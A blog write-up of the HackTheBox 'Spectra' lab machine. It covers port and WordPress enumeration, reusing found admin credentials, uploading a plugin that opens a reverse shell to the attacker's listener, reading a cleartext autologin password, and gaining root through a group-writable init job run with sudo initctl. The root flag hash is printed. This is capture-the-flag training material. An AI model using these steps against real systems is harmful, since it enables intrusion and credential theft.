---
layout: post
title: "Spectra Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Spectra

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.140.148 folder that I have attached to this post.

## Enumeration summary

```
/main                 (Status: 301) [Size: 169] [--> http://10.129.140.148/main/]

/testing              (Status: 301) [Size: 169] [--> http://10.129.140.148/testing/]

DIRECTORY: http://10.129.140.148/main/wp-content/

DIRECTORY: http://10.129.140.148/main/wp-includes/

DIRECTORY: http://10.129.140.148/main/wp-admin/
```

```
PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)

80/tcp   open  http    nginx 1.17.4
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).

3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
```

```
+ Retrieved x-powered-by header: PHP/5.6.40
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /testing/: Directory indexing found.
+ OSVDB-3092: /testing/: This might be interesting...
```

```
PORT      STATE         SERVICE      REASON              VERSION
53/udp    open|filtered domain       no-response
67/udp    open|filtered dhcps        no-response
68/udp    open|filtered dhcpc        no-response
69/udp    open|filtered tftp         no-response
123/udp   closed        ntp          port-unreach ttl 63
135/udp   closed        msrpc        port-unreach ttl 63
137/udp   open|filtered netbios-ns   no-response
138/udp   open|filtered netbios-dgm  no-response
139/udp   open|filtered netbios-ssn  no-response
161/udp   open|filtered snmp         no-response
162/udp   closed        snmptrap     port-unreach ttl 63
445/udp   open|filtered microsoft-ds no-response
500/udp   open|filtered isakmp       no-response
514/udp   open|filtered syslog       no-response
520/udp   open|filtered route        no-response
631/udp   open|filtered ipp          no-response
1434/udp  open|filtered ms-sql-m     no-response
1900/udp  open|filtered upnp         no-response
4500/udp  closed        nat-t-ike    port-unreach ttl 63
49152/udp open|filtered unknown      no-response
```

```
[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://spectra.htb/main/?feed=rss2, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://spectra.htb/main/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.2</generator>

```

```
[+] WordPress theme in use: twentytwenty
 | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

```



## Exploitation

Started added spectra to hosts. And enumerating the bunch:

![image-20210503114454943](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503114454943.png)

Lol this is ez access to the database:

![image-20210503115823669](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503115823669.png)

Connection did not work. Though administrator:devteam01 worked on wp-admin:

![image-20210503121114245](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503121114245.png)

Used this to create a reverse shell: https://github.com/kylepott/Conwell-Quotes

Uploaded the plugin, started listener for 1234 and typed this into browser:

```
http://spectra.htb/main/wp-content/plugins/conwell/error.php?ip=10.10.14.42&port=1234
```

And we have a shell, but we are not user:

```
$ ls -al
total 36
drwxr-xr-x 5 katie katie 4096 Feb  2 15:57 .
drwxr-xr-x 8 root  root  4096 Feb  2 15:55 ..
lrwxrwxrwx 1 root  root     9 Feb  2 15:55 .bash_history -> /dev/null
-rw-r--r-- 1 katie katie  127 Dec 22 05:46 .bash_logout
-rw-r--r-- 1 katie katie  204 Dec 22 05:46 .bash_profile
-rw-r--r-- 1 katie katie  551 Dec 22 05:46 .bashrc
drwx------ 3 katie katie 4096 Jan 15 15:55 .pki
drwx------ 2 katie katie 4096 Feb 10 06:10 .ssh
drwxr-xr-x 2 katie katie 4096 Jan 15 15:55 log
-r-------- 1 katie katie   33 Feb  2 15:57 user.txt
$ cat user.txt
cat: user.txt: Permission denied
$ id
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
$ 

```

Linpeas time, enter bash before running since SELinux is wacky on this box:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.32

```

Why am I running linPEAS I can access that database and extract hashes from there.

```
mysql -u administrator -p devteam01 -e 'show databases;'
```

Could still not connect, maybe because I need to be chronos user:

```
[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-rwxr-xr-x 1 root    root      551984 Dec 22 05:46 /bin/bash
lrwxrwxrwx 1 root    root           4 Dec 22 05:46 /bin/sh -> dash
-rwxr-xr-x 1 root    root      611344 Jan 15 15:34 /opt/tpm1/sbin/attestationd
-rwxr-xr-x 1 root    root      480416 Jan 15 15:34 /opt/tpm1/sbin/chapsd
-rwxr-xr-x 1 root    root     1546944 Jan 15 15:34 /opt/tpm1/sbin/cryptohomed
-rwxr-xr-x 1 root    root      218472 Jan 15 15:33 /opt/tpm1/sbin/tpm_managerd
-r-xr-xr-x 1 root    root      217064 Dec 22 05:54 /sbin/dhcpcd
-rwxr-xr-x 1 root    root      131408 Dec 22 05:54 /sbin/init
-rwxr-xr-x 1 root    root      134840 Jan 15 15:30 /sbin/minijail0
-rwxr-xr-x 1 root    root       88192 Jan 15 15:33 /usr/bin/anomaly_detector
-rwxr-xr-x 1 root    root       49496 Jan 15 15:33 /usr/bin/btdispatch
-rwxr-xr-x 1 root    root      901528 Dec 22 05:45 /usr/bin/coreutils
-rwxr-xr-x 1 root    root      745448 Jan 15 15:32 /usr/bin/cros_healthd
-rwxr-xr-x 1 root    root       26696 Dec 22 05:52 /usr/bin/logger
-rwxr-xr-x 1 root    root      455712 Jan 15 15:31 /usr/bin/memd
-rwxr-xr-x 1 root    root      240072 Jan 15 15:32 /usr/bin/metrics_daemon
-rwxr-xr-x 1 root    root      391256 Jan 15 15:34 /usr/bin/patchpaneld$ dir
VirtualBox	     broadcom	  eeti	  neverware  tpm2
autologin.conf.orig  displaylink  google  tpm1
$ cat autologin.conf.orig
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script$ ls /etc/autologin 
passwd
$ cat /etc/autologin/passwd
SummerHereWeCome!!
-rwxr-xr-x 1 root    root      112032 Jan 15 15:32 /usr/bin/permission_broker
-rwxr-xr-x 1 root    root     2021408 Jan 15 15:34 /usr/bin/shill
-rwxr-xr-x 1 root    root       46248 Dec 22 05:53 /usr/bin/tlsdated
-rwxr-xr-x 1 root    root      127832 Dec 22 05:59 /usr/lib/systemd/systemd-journald
-rwxr-xr-x 1 root    root      736952 Dec 22 06:10 /usr/libexec/bluetooth/bluetoothd
-rwxr-xr-x 1 chronos chronos 24561680 Jun 29  2020 /usr/local/bin/mysqld
-rwxr-xr-x 1 root    root      259976 Feb 11 23:12 /usr/local/bin/vmtoolsd
-rwxr-xr-x 1 root    root      945536 Dec 22 05:57 /usr/sbin/ModemManager
-rwxr-xr-x 1 root    root      116208 Jan 15 15:33 /usr/sbin/oobe_config_restore
-rwxr-xr-x 1 root    root      549928 Dec 22 05:53 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root    root      585080 Dec 22 05:55 /usr/sbin/sshd
-rwxr-xr-x 1 root    root     1306176 Dec 22 05:59 /usr/sbin/wpa_supplicant

```

Stumbled upon this file in /opt:

```
$ dir
VirtualBox	     broadcom	  eeti	  neverware  tpm2
autologin.conf.orig  displaylink  google  tpm1
$ cat autologin.conf.orig
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script$ ls /etc/autologin 
passwd
$ cat /etc/autologin/passwd
SummerHereWeCome!!
```

And we have a password, for some user. Ssh to katie with it and you are user. Linpeas time again to become root:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.32

```

```
[+] Useful software
/usr/local/bin/wget
/usr/local/bin/curl
/bin/ping
/usr/local/bin/gcc
/usr/local/bin/g++
/usr/local/bin/make
/usr/local/bin/gdb
/usr/bin/base64
/usr/local/bin/python
/usr/local/bin/python2
/usr/local/bin/python3
/usr/local/bin/python2.7
/usr/bin/python3.6
/usr/local/bin/perl
/usr/local/bin/php
/usr/local/bin/ruby
/usr/bin/sudo

[+] Installed Compiler
/usr/local/bin/gcc
/usr/local/bin/g++

```

```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl

```

```
[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
total 368K
/usr/local/bin/strings: '': No such file
  --- Trying to execute  with strace in order to look for hijackable libraries...
/usr/local/bin/strace: Can't stat '': No such file or directory

You own the SGID file: .bash_logout
You own the SGID file: .bash_profile
You own the SGID file: .bashrc
You own the SGID file: log
You own the SGID file: .pki
You can write SGID file: .bash_history
You own the SGID file: user.txt
You own the SGID file: .ssh
You own the SGID file: linpeas.sh
You own the SGID file: .gnupg

```

```
[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
```

```
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group katie:

  Group developers:
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
#)You_can_write_even_more_files_inside_last_directory

/srv/nodetest.js

```

The test.conf files can be run as sudo by initctl. And we can edit them because they are for our group. Aka lets spawn a shell in test.conf:

![image-20210503145110605](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503145110605.png)

And run it as root:

![image-20210503145157522](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503145157522.png)

```
d44519713b889d5e1f9e536d0c6df2fc
```

## Final thoughts

Nice 20 pointer.
